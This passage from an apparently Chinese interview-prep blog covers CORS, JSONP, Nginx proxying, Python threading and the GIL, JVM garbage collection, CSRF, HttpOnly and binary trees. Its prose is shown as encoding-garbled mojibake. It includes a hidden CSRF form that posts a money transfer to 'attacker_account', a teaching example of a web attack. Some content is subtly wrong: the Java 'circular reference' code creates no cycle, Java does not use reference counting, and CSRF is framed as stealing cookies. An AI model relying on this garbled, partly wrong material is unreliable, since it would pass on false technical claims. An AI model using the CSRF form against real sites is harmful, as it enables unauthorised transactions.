class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/data&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    <span class="comment"># è®¾ç½®å“åº”å¤´</span></span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;This is cross-origin data&#x27;</span>&#125;)</span><br><span class="line">    response.headers.add(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;http://example.com&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p><strong>å®‰å…¨é—®é¢˜</strong>ï¼š</p><ul><li><strong>ä¿¡æ¯æ³„éœ²</strong>ï¼šå¦‚æœ<code>Access-Control-Allow-Origin</code>è®¾ç½®ä¸º<code>*</code>ï¼Œä»»ä½•åŸŸéƒ½å¯ä»¥è®¿é—®è¯¥èµ„æºï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿæ•°æ®æ³„éœ²ã€‚</li><li><strong>CSRFæ”»å‡»</strong>ï¼šå¦‚æœå…è®¸å‡­æ®ï¼ˆå¦‚Cookieï¼‰ï¼Œéœ€è¦ç¡®ä¿è¯·æ±‚æ¥æºçš„åˆæ³•æ€§ï¼Œé¿å…CSRFæ”»å‡»ã€‚</li></ul><h4 id="2-JSONPï¼ˆJSON-with-Paddingï¼‰"><a href="#2-JSONPï¼ˆJSON-with-Paddingï¼‰" class="headerlink" title="2. JSONPï¼ˆJSON with Paddingï¼‰"></a>2. JSONPï¼ˆJSON with Paddingï¼‰</h4><p><strong>åŸç†</strong>ï¼šJSONPåˆ©ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ç‰¹æ€§ï¼Œé€šè¿‡åŠ¨æ€åˆ›å»ºè„šæœ¬å®ç°è·¨åŸŸæ•°æ®è·å–ã€‚æœåŠ¡ç«¯è¿”å›çš„æ•°æ®è¢«åŒ…è£…åœ¨ä¸€ä¸ªå‡½æ•°è°ƒç”¨ä¸­ï¼Œå‰ç«¯é€šè¿‡å®šä¹‰å›è°ƒå‡½æ•°æ¥å¤„ç†æ•°æ®ã€‚</p><p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‰ç«¯ä»£ç </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received data:&#x27;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;https://api.example.com/data?callback=handleResponse&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure><p><strong>å®‰å…¨é—®é¢˜</strong>ï¼š</p><ul><li><strong>XSSæ”»å‡»</strong>ï¼šç”±äºJSONPåŠ è½½çš„æ˜¯å¤–éƒ¨è„šæœ¬ï¼Œå¦‚æœæœåŠ¡ç«¯è¿”å›æ¶æ„è„šæœ¬ï¼Œå¯èƒ½ä¼šå¯¼è‡´XSSæ”»å‡»ã€‚</li><li><strong>é™åˆ¶GETè¯·æ±‚</strong>ï¼šJSONPåªæ”¯æŒGETè¯·æ±‚ï¼Œæ— æ³•å¤„ç†POSTç­‰å…¶ä»–HTTPæ–¹æ³•ã€‚</li></ul><h4 id="3-Nginxåå‘ä»£ç†"><a href="#3-Nginxåå‘ä»£ç†" class="headerlink" title="3. Nginxåå‘ä»£ç†"></a>3. Nginxåå‘ä»£ç†</h4><p><strong>åŸç†</strong>ï¼šé€šè¿‡Nginxé…ç½®ï¼Œå°†å‰ç«¯è¯·æ±‚è½¬å‘åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œä½¿æµè§ˆå™¨è®¤ä¸ºæ‰€æœ‰è¯·æ±‚éƒ½æ¥è‡ªåŒä¸€åŸŸï¼Œä»è€Œé¿å…è·¨åŸŸé—®é¢˜ã€‚</p><p><strong>Nginxé…ç½®ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> localhost;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /api &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://api.example.com;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å®‰å…¨é—®é¢˜</strong>ï¼š</p><ul><li><strong>ä»£ç†é…ç½®ä¸å½“</strong>ï¼šå¦‚æœä»£ç†é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šæš´éœ²å†…éƒ¨æœåŠ¡åœ°å€ï¼Œå¢åŠ å®‰å…¨é£é™©ã€‚</li><li><strong>æ€§èƒ½é—®é¢˜</strong>ï¼šä»£ç†æœåŠ¡å™¨éœ€è¦å¤„ç†é¢å¤–çš„è¯·æ±‚ï¼Œå¯èƒ½ä¼šå¢åŠ ç³»ç»Ÿè´Ÿè½½ã€‚</li></ul><h3 id="Pythonå¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹å¦‚ä½•é€‰æ‹©"><a href="#Pythonå¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹å¦‚ä½•é€‰æ‹©" class="headerlink" title="Pythonå¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹å¦‚ä½•é€‰æ‹©"></a>Pythonå¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹å¦‚ä½•é€‰æ‹©</h3><h4 id="1-å¤šçº¿ç¨‹"><a href="#1-å¤šçº¿ç¨‹" class="headerlink" title="1. å¤šçº¿ç¨‹"></a>1. å¤šçº¿ç¨‹</h4><p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p><ul><li><strong>I&#x2F;Oå¯†é›†å‹ä»»åŠ¡</strong>ï¼šå¦‚ç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ç­‰ï¼Œçº¿ç¨‹å¯ä»¥åˆ©ç”¨ç­‰å¾…æ—¶é—´è¿›è¡Œå…¶ä»–ä»»åŠ¡ã€‚</li><li><strong>éœ€è¦å¿«é€Ÿå“åº”çš„åœºæ™¯</strong>ï¼šå¦‚WebæœåŠ¡å™¨å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚ã€‚</li></ul><p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">io_bound_task</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;threading.current_thread().name&#125;</span> started&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)  <span class="comment"># æ¨¡æ‹ŸI/Oæ“ä½œ</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;threading.current_thread().name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    t = threading.Thread(target=io_bound_task)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><h4 id="2-å¤šè¿›ç¨‹"><a href="#2-å¤šè¿›ç¨‹" class="headerlink" title="2. å¤šè¿›ç¨‹"></a>2. å¤šè¿›ç¨‹</h4><p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p><ul><li><strong>è®¡ç®—å¯†é›†å‹ä»»åŠ¡</strong>ï¼šéœ€è¦åˆ©ç”¨å¤šæ ¸CPUçš„å¹¶è¡Œè®¡ç®—èƒ½åŠ›ã€‚</li><li><strong>éœ€è¦é«˜ç¨³å®šæ€§å’Œèµ„æºç‹¬ç«‹æ€§çš„åœºæ™¯</strong>ã€‚</li></ul><p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_bound_task</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Process <span class="subst">&#123;Process.name&#125;</span> started&quot;</span>)</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Process <span class="subst">&#123;Process.name&#125;</span> finished&quot;</span>)</span><br><span class="line"></span><br><span class="line">processes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    p = Process(target=cpu_bound_task)</span><br><span class="line">    processes.append(p)</span><br><span class="line">    p.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure><h3 id="Pythonçš„GILé”æœ¬è´¨ä¸Šåšäº†ä»€ä¹ˆäº‹æƒ…"><a href="#Pythonçš„GILé”æœ¬è´¨ä¸Šåšäº†ä»€ä¹ˆäº‹æƒ…" class="headerlink" title="Pythonçš„GILé”æœ¬è´¨ä¸Šåšäº†ä»€ä¹ˆäº‹æƒ…"></a>Pythonçš„GILé”æœ¬è´¨ä¸Šåšäº†ä»€ä¹ˆäº‹æƒ…</h3><p><strong>GILï¼ˆGlobal Interpreter Lockï¼‰</strong>æ˜¯Pythonè§£é‡Šå™¨çš„ä¸€ä¸ªæœºåˆ¶ï¼Œç”¨äºç¡®ä¿åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡ŒPythonå­—èŠ‚ç ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ï¼š</p><ul><li><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šé¿å…å¤šçº¿ç¨‹åŒæ—¶æ“ä½œPythonå¯¹è±¡ï¼Œç¡®ä¿çº¿ç¨‹å®‰å…¨ã€‚</li><li><strong>ç®€åŒ–å†…å­˜ç®¡ç†</strong>ï¼šå‡å°‘å†…å­˜åˆ†é…å’Œåƒåœ¾å›æ”¶çš„å¤æ‚æ€§ã€‚</li></ul><p><strong>å½±å“</strong>ï¼š</p><ul><li><strong>æ€§èƒ½ç“¶é¢ˆ</strong>ï¼šåœ¨å¤šæ ¸CPUä¸Šï¼ŒGILä¼šé™åˆ¶å¤šçº¿ç¨‹çš„æ€§èƒ½ï¼Œå› ä¸ºçº¿ç¨‹æ— æ³•çœŸæ­£å¹¶è¡Œæ‰§è¡Œã€‚</li><li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¯¹äºI&#x2F;Oå¯†é›†å‹ä»»åŠ¡ï¼ŒGILçš„å½±å“è¾ƒå°ï¼›ä½†å¯¹äºè®¡ç®—å¯†é›†å‹ä»»åŠ¡ï¼Œå»ºè®®ä½¿ç”¨å¤šè¿›ç¨‹æˆ–Cæ‰©å±•ã€‚</li></ul><h3 id="Javaçš„JVMä¸ºä»€ä¹ˆè¦æœ‰GCROOT"><a href="#Javaçš„JVMä¸ºä»€ä¹ˆè¦æœ‰GCROOT" class="headerlink" title="Javaçš„JVMä¸ºä»€ä¹ˆè¦æœ‰GCROOT"></a>Javaçš„JVMä¸ºä»€ä¹ˆè¦æœ‰GCROOT</h3><p><strong>GCROOTï¼ˆåƒåœ¾å›æ”¶æ ¹ï¼‰</strong>æ˜¯Javaè™šæ‹Ÿæœºä¸­åƒåœ¾å›æ”¶çš„èµ·ç‚¹ã€‚GCROOTé€šå¸¸åŒ…æ‹¬ï¼š</p><ul><li><strong>Javaæ ˆä¸­çš„å±€éƒ¨å˜é‡</strong>ï¼šæ–¹æ³•è°ƒç”¨ä¸­çš„å‚æ•°å’Œå±€éƒ¨å˜é‡ã€‚</li><li><strong>æœ¬åœ°æ–¹æ³•æ ˆä¸­çš„å¼•ç”¨</strong>ï¼šNativeæ–¹æ³•ä¸­çš„Javaå¯¹è±¡å¼•ç”¨ã€‚</li><li><strong>è¿è¡Œæ—¶å¸¸é‡æ± ä¸­çš„ç±»é™æ€å±æ€§å’Œå¸¸é‡</strong>ã€‚</li></ul><p>GCROOTçš„ä½œç”¨æ˜¯ï¼š</p><ul><li><strong>æ ‡è®°æ´»åŠ¨å¯¹è±¡</strong>ï¼šåƒåœ¾å›æ”¶å™¨ä»GCROOTå¼€å§‹æ ‡è®°æ‰€æœ‰å¯è¾¾å¯¹è±¡ã€‚</li><li><strong>ç¡®å®šåƒåœ¾å¯¹è±¡</strong>ï¼šæœªè¢«GCROOTå¯è¾¾çš„å¯¹è±¡å°†è¢«å›æ”¶ã€‚</li></ul><h3 id="Javaçš„JVMæœ‰å“ªäº›åƒåœ¾æ”¶é›†å™¨"><a href="#Javaçš„JVMæœ‰å“ªäº›åƒåœ¾æ”¶é›†å™¨" class="headerlink" title="Javaçš„JVMæœ‰å“ªäº›åƒåœ¾æ”¶é›†å™¨"></a>Javaçš„JVMæœ‰å“ªäº›åƒåœ¾æ”¶é›†å™¨</h3><ol><li><strong>Serialæ”¶é›†å™¨</strong>ï¼šå•çº¿ç¨‹æ”¶é›†å™¨ï¼Œé€‚ç”¨äºå•æ ¸CPUå’Œå°å†…å­˜åº”ç”¨ã€‚</li><li><strong>ParNewæ”¶é›†å™¨</strong>ï¼šSerialçš„å¤šçº¿ç¨‹ç‰ˆæœ¬ï¼Œé€‚ç”¨äºå¤šæ ¸CPUã€‚</li><li><strong>Parallel Scavengeæ”¶é›†å™¨</strong>ï¼šå…³æ³¨ååé‡ï¼Œé€‚ç”¨äºåå°è¿è¡Œçš„åº”ç”¨ã€‚</li><li><strong>Serial Oldæ”¶é›†å™¨</strong>ï¼šSerialçš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œé€‚ç”¨äºå°å†…å­˜åº”ç”¨ã€‚</li><li><strong>Parallel Oldæ”¶é›†å™¨</strong>ï¼šParallel Scavengeçš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œé€‚ç”¨äºå¤šæ ¸CPUã€‚</li><li><strong>CMSï¼ˆConcurrent Mark Sweepï¼‰æ”¶é›†å™¨</strong>ï¼šä½å»¶è¿Ÿæ”¶é›†å™¨ï¼Œé€‚ç”¨äºå¯¹å“åº”æ—¶é—´æ•æ„Ÿçš„åº”ç”¨ã€‚</li><li><strong>G1ï¼ˆGarbage-Firstï¼‰æ”¶é›†å™¨</strong>ï¼šåˆ†åŒºæ”¶é›†å™¨ï¼Œé€‚ç”¨äºå¤§å†…å­˜å’Œå¯¹å»¶è¿Ÿæœ‰è¦æ±‚çš„åº”ç”¨ã€‚</li></ol><h3 id="åƒåœ¾å›æ”¶è®¡æ•°å¼•ç”¨æœºåˆ¶çš„ç¼ºç‚¹æ˜¯ä»€ä¹ˆ"><a href="#åƒåœ¾å›æ”¶è®¡æ•°å¼•ç”¨æœºåˆ¶çš„ç¼ºç‚¹æ˜¯ä»€ä¹ˆ" class="headerlink" title="åƒåœ¾å›æ”¶è®¡æ•°å¼•ç”¨æœºåˆ¶çš„ç¼ºç‚¹æ˜¯ä»€ä¹ˆ"></a>åƒåœ¾å›æ”¶è®¡æ•°å¼•ç”¨æœºåˆ¶çš„ç¼ºç‚¹æ˜¯ä»€ä¹ˆ</h3><ol><li><strong>æ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨</strong>ï¼šå¦‚æœä¸¤ä¸ªå¯¹è±¡äº’ç›¸å¼•ç”¨ï¼Œä½†æ²¡æœ‰å…¶ä»–å¼•ç”¨æŒ‡å‘å®ƒä»¬ï¼Œè®¡æ•°å¼•ç”¨æœºåˆ¶æ— æ³•å›æ”¶è¿™äº›å¯¹è±¡ã€‚</li><li><strong>æ€§èƒ½å¼€é”€</strong>ï¼šç»´æŠ¤å¼•ç”¨è®¡æ•°éœ€è¦é¢å¤–çš„å†…å­˜å’Œè®¡ç®—èµ„æºã€‚</li><li><strong>å¤æ‚æ€§</strong>ï¼šåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œå¼•ç”¨è®¡æ•°éœ€è¦åŒæ­¥æ“ä½œï¼Œå¢åŠ äº†å®ç°çš„å¤æ‚æ€§ã€‚</li></ol><p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferenceCountingExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        a = b;</span><br><span class="line">        b = a; <span class="comment">// å¾ªç¯å¼•ç”¨ï¼Œä½†æ²¡æœ‰å…¶ä»–å¼•ç”¨æŒ‡å‘å®ƒä»¬</span></span><br><span class="line">        <span class="comment">// æ­¤æ—¶ï¼Œaå’Œbäº’ç›¸å¼•ç”¨ï¼Œä½†æ²¡æœ‰å…¶ä»–å¼•ç”¨æŒ‡å‘å®ƒä»¬ï¼Œæ— æ³•è¢«åƒåœ¾å›æ”¶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CSRF-æ€ä¹ˆæ‹¿åˆ°-Cookie"><a href="#CSRF-æ€ä¹ˆæ‹¿åˆ°-Cookie" class="headerlink" title="CSRF æ€ä¹ˆæ‹¿åˆ° Cookie"></a>CSRF æ€ä¹ˆæ‹¿åˆ° Cookie</h3><p>CSRFï¼ˆCross-Site Request Forgeryï¼‰æ”»å‡»çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨å—å®³è€…çš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆå¦‚Cookieï¼‰å‘é€æ¶æ„è¯·æ±‚ã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨æºå¸¦ç”¨æˆ·çš„Cookieï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¼ªé€ è¯·æ±‚æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªHTMLè¡¨å•ï¼Œæäº¤åˆ°ç›®æ ‡ç½‘ç«™ï¼Œä»è€Œè§¦å‘CSRFæ”»å‡»ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://example.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker_account&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click Me&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å½“ç”¨æˆ·è®¿é—®åŒ…å«æ­¤è¡¨å•çš„æ¶æ„é¡µé¢å¹¶æäº¤è¡¨å•æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æºå¸¦ç”¨æˆ·çš„Cookieï¼Œä»è€Œå®Œæˆæ”»å‡»ã€‚</p><h3 id="ä¸åŒåŸŸåæ€æ ·é€šè¿‡-CSRF-æ‹¿-Cookie"><a href="#ä¸åŒåŸŸåæ€æ ·é€šè¿‡-CSRF-æ‹¿-Cookie" class="headerlink" title="ä¸åŒåŸŸåæ€æ ·é€šè¿‡ CSRF æ‹¿ Cookie"></a>ä¸åŒåŸŸåæ€æ ·é€šè¿‡ CSRF æ‹¿ Cookie</h3><p>è·¨åŸŸåœºæ™¯ä¸‹ï¼ŒCSRFæ”»å‡»çš„å¯è¡Œæ€§å–å†³äºç›®æ ‡ç½‘ç«™çš„Cookieè®¾ç½®ã€‚å¦‚æœç›®æ ‡ç½‘ç«™çš„Cookieè®¾ç½®äº†<code>SameSite</code>å±æ€§ä¸º<code>Strict</code>æˆ–<code>Lax</code>ï¼Œåˆ™è·¨åŸŸè¯·æ±‚ä¸ä¼šæºå¸¦Cookieã€‚å¦‚æœ<code>SameSite</code>è®¾ç½®ä¸º<code>None</code>ä¸”å¯ç”¨äº†<code>Secure</code>å±æ€§ï¼Œè·¨åŸŸè¯·æ±‚å¯ä»¥æºå¸¦Cookieã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®Cookie</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;666666&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;expires&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span> =&gt; <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;secure&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;samesite&#x27;</span> =&gt; <span class="string">&#x27;None&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ è·¨åŸŸè¯·æ±‚æ¥å°è¯•åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚</p><h3 id="HTTP-Only-æœ¬è´¨ä¸Šåšäº†ä»€ä¹ˆäº‹æƒ…"><a href="#HTTP-Only-æœ¬è´¨ä¸Šåšäº†ä»€ä¹ˆäº‹æƒ…" class="headerlink" title="HTTP-Only æœ¬è´¨ä¸Šåšäº†ä»€ä¹ˆäº‹æƒ…"></a>HTTP-Only æœ¬è´¨ä¸Šåšäº†ä»€ä¹ˆäº‹æƒ…</h3><p>HTTP-Only å±æ€§ç”¨äºé˜²æ­¢JavaScriptè®¿é—®Cookieï¼Œä»è€Œé¿å…XSSæ”»å‡»ä¸­Cookieè¢«çªƒå–ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScriptæ— æ³•è®¿é—®HTTP-Only Cookie</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>; <span class="comment">// è¿”å›çš„Cookieä¸­ä¸åŒ…å«HTTP-Onlyå±æ€§çš„å€¼</span></span><br></pre></td></tr></table></figure><p>HTTP-Only ä»…å…è®¸Cookieé€šè¿‡HTTPåè®®ä¼ è¾“ï¼Œè€Œä¸èƒ½é€šè¿‡JavaScriptè¯»å–æˆ–ä¿®æ”¹ã€‚</p><h3 id="å¹³è¡¡äºŒå‰æ ‘å’ŒäºŒå‰æœç´¢æ ‘"><a href="#å¹³è¡¡äºŒå‰æ ‘å’ŒäºŒå‰æœç´¢æ ‘" class="headerlink" title="å¹³è¡¡äºŒå‰æ ‘å’ŒäºŒå‰æœç´¢æ ‘"></a>å¹³è¡¡äºŒå‰æ ‘å’ŒäºŒå‰æœç´¢æ ‘</h3><ol><li><strong>å¹³è¡¡äºŒå‰æ ‘</strong>ï¼šæ˜¯ä¸€ç§ç‰¹æ®Šçš„äºŒå‰æ ‘ï¼Œå…¶å·¦å³å­æ ‘çš„é«˜åº¦å·®ä¸è¶…è¿‡1ã€‚ä¾‹å¦‚AVLæ ‘ï¼Œé€šè¿‡æ—‹è½¬æ“ä½œä¿æŒå¹³è¡¡ã€‚</li><li><strong>äºŒå‰æœç´¢æ ‘</strong>ï¼šå·¦å­æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹å€¼å°äºæ ¹èŠ‚ç‚¹ï¼Œå³å­æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹å€¼å¤§äºæ ¹èŠ‚ç‚¹ã€‚ä¾‹å¦‚ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>.val = val</span><br><span class="line">        <span class="variable language_">self</span>.left = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">root, val</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span> TreeNode(val)</span><br><span class="line">    <span class="keyword">if</span> val &lt; root.val:</span><br><span class="line">        root.left = insert(root.left, val)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        root.right = insert(root.right, val)</span><br><span class="line">    <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><p>å¹³è¡¡äºŒå‰æ 